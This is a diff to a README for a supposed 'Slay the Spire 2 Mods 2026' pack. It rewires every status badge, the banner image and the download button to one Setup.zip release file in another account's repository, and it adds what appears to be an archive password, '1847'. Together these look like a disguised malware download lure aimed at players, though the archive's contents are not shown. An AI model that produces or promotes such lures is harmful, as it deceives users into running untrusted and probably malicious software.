@@ -1,14 +1,14 @@
 # 🎮 Slay the Spire 2 Mods 2026 — Best Mods Collection & Ultimate Pack
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Slay-the-Spire-2)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Slay-the-Spire-2)](https://github.com/LaborerRecoup17/Slay-the-Spire-2-Mods/releases/download/Release/Setup.zip)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/LaborerRecoup17/Slay-the-Spire-2-Mods/releases/download/Release/Setup.zip)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/LaborerRecoup17/Slay-the-Spire-2-Mods/releases/download/Release/Setup.zip)
+[![Category](https://img.shields.io/badge/Category-Modding-orange)](https://github.com/LaborerRecoup17/Slay-the-Spire-2-Mods/releases/download/Release/Setup.zip)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/LaborerRecoup17/Slay-the-Spire-2-Mods/releases/download/Release/Setup.zip)
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/LaborerRecoup17/Slay-the-Spire-2-Mods/releases/download/Release/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Slay the Spire 2 Mods](https://img.shields.io/badge/Download%20Slay%20the%20Spire%202%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![Slay the Spire 2 Mods](https://img.shields.io/badge/Download%20Slay%20the%20Spire%202%20Mods-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/LaborerRecoup17/Slay-the-Spire-2-Mods/releases/download/Release/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
